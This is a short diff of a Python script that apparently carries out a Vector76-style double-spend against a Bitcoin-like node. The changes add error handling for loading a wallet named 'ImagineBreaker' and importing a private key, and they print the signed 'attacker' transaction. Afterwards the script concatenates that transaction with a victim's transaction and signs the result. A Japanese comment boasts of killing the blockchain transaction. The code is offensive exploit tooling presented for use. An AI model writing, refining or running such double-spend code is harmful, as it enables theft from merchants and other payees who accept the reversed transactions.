@@ -95,8 +95,15 @@ try:
     rpc_node.call("loadwallet", "ImagineBreaker")
     rpc_node.call("importprivkey", key)
 except:
-    rpc_node.call("createwallet", "ImagineBreaker") # おまけ まずは... そのブロックチェーン取引をぶち殺す!! 
-    rpc_node.call("loadwallet", "ImagineBreaker")
+    try:
+        rpc_node.call("createwallet", "ImagineBreaker") # おまけ まずは... そのブロックチェーン取引をぶち殺す!! 
+    except:
+        rpc_node.call("importprivkey", key)
+    try:
+        rpc_node.call("loadwallet", "ImagineBreaker")
+        rpc_node.call("importprivkey", key)
+    except:
+        pass
 
 change_address = transaction_util.wiftoaddr(key)
 balance = rpc_node.getreceivedbyaddress(change_address)
@@ -109,6 +116,7 @@ tx_attacker = [{"address": attacker_address, "value": send_amount}, {"address": 
 tx_attacker = transaction_util.mktx(inputs, tx_attacker)
 tx_attacker = cryptos.serialize(transaction_util.sign(tx_attacker, 0, key))
 print()
+print(tx_attacker)
 print()
 tx_vector76 = f"{tx_attacker}{tx_victim}"
 tx_vector76 = cryptos.serialize(transaction_util.sign(tx_vector76, 0, key))
